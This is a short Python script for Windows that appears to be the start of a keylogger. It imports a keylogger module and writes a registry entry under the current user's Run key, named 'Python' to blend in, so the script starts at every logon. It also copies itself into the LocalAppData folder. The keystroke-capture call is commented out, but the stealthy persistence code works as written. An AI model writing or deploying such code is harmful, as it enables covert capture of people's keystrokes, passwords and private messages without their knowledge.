import os, sys
import winreg
from my_super_modules import keylogger

log_dir = os.environ['userprofile']
log_name = 'applog.txt'
dir_name = os.path.dirname(os.path.realpath(__file__))
file_name = os.path.basename(sys.argv[0])
path = os.path.join(dir_name, file_name)

REG_PATH = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
os.system(f"REG ADD HKCU\\{REG_PATH} /v Python /t REG_SZ /d {path}")


# if first launch, copy to safe place and add key registry to be launched at start
if  dir_name != os.environ['localappdata']:
    os.system(f"copy {file_name} {os.environ['localappdata']}")

#keylogger.get_keystrokes(log_dir, log_name)